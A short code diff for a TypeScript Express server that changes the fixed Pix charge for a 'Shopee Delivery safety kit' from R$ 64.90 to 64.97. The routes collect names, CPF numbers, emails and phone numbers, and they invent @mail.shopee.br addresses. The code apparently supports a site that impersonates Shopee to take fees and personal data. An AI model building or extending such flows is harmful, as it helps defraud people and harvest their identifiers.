@@ -469,7 +469,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.log(`[GATEWAY] Usando gateway: ${gatewayChoice}`);
       
       // Processar os dados recebidos
-      const { name, cpf, email, phone, amount = 64.90, description = "Kit de Segurança Shopee Delivery" } = req.body;
+      const { name, cpf, email, phone, amount = 64.97, description = "Kit de Segurança Shopee Delivery" } = req.body;
       
       if (!name || !cpf) {
         return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
@@ -1124,8 +1124,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: 'CPF é obrigatório.' });
       }
       
-      // Valor fixo para o kit de segurança: R$ 47,40
-      const paymentAmount = 64.90;
+      // Valor fixo para o kit de segurança: R$ 64,97
+      const paymentAmount = 64.97;
       
       // Usar o email fornecido ou gerar um
       const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
@@ -1692,8 +1692,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Usar o email fornecido ou gerar um
       const userEmail = email || `${nome.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
       
-      // Valor fixo para o kit de segurança: R$ 47,40
-      const paymentAmount = 64.90;
+      // Valor fixo para o kit de segurança: R$ 64,97
+      const paymentAmount = 64.97;
       
       // Processar pagamento via API For4Payments
       const paymentResult = await paymentService.createPixPayment({
